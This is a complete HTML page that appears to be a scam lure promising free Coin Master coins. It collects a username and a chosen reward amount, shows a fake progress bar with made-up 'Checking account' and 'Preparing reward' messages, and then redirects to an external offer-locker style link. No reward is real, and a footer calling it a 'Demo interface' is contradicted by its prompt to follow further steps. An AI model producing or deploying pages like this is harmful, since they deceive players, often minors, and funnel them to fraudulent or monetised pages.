<!DOCTYPE html>
<html>
<head>
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Coin Master Rewards</title>

<style>
body{
  margin:0;
  font-family:Arial, sans-serif;
  background:#000;
  color:#fff;
  text-align:center;
}

/* HEADER */
.header{
  padding:20px;
  font-size:22px;
  color:#66ccff;
  text-shadow:0 0 10px #66ccff;
}

/* BOX */
.box{
  max-width:360px;
  margin:20px auto;
  background:#111;
  border-radius:15px;
  padding:20px;
  box-shadow:0 0 15px rgba(0,255,255,0.2);
}

/* INPUT */
input, select{
  width:90%;
  padding:12px;
  margin:10px;
  border-radius:10px;
  border:none;
}

/* BUTTON */
button{
  width:90%;
  padding:14px;
  background:#00ffaa;
  border:none;
  border-radius:10px;
  font-weight:bold;
  font-size:16px;
}

/* LOADING BAR */
.bar{
  width:90%;
  height:20px;
  background:#222;
  border-radius:10px;
  margin:20px auto;
  overflow:hidden;
  display:none;
}

.progress{
  width:0%;
  height:100%;
  background:#00ffaa;
}

/* TEXT */
.status{
  font-size:14px;
  margin-top:10px;
}
</style>
</head>

<body>

<div class="header">🎰 Coin Master Rewards</div>

<div class="box">

<input type="text" id="user" placeholder="Enter your username">

<select id="amount">
  <option>Select reward</option>
  <option>10,000 Coins</option>
  <option>50,000 Coins</option>
  <option>100,000 Coins</option>
</select>

<button onclick="start()">Continue</button>

<div class="bar" id="bar">
  <div class="progress" id="p"></div>
</div>

<div class="status" id="status"></div>

<p style="font-size:11px; opacity:0.6; margin-top:15px;">
Demo interface. Follow the next steps to proceed.
</p>

</div>

<script>
function start(){
  let user = document.getElementById("user").value;
  let amount = document.getElementById("amount").value;

  if(user=="" || amount=="Select reward"){
    alert("Please complete all fields");
    return;
  }

  document.getElementById("bar").style.display="block";

  let p=0;
  let bar=document.getElementById("p");
  let status=document.getElementById("status");

  let i=setInterval(()=>{
    p+=10;
    bar.style.width=p+"%";

    if(p==20) status.innerText="Connecting...";
    if(p==40) status.innerText="Checking account...";
    if(p==60) status.innerText="Preparing reward...";
    if(p==80) status.innerText="Finalizing...";
    if(p==100){
      clearInterval(i);
      status.innerText="Done! Continue to the next step.";

      setTimeout(()=>{
        window.location.href="https://appchecker.space/cl/i/271x3k";
      },1500);
    }

  },400);
}
</script>

</body>
</html>
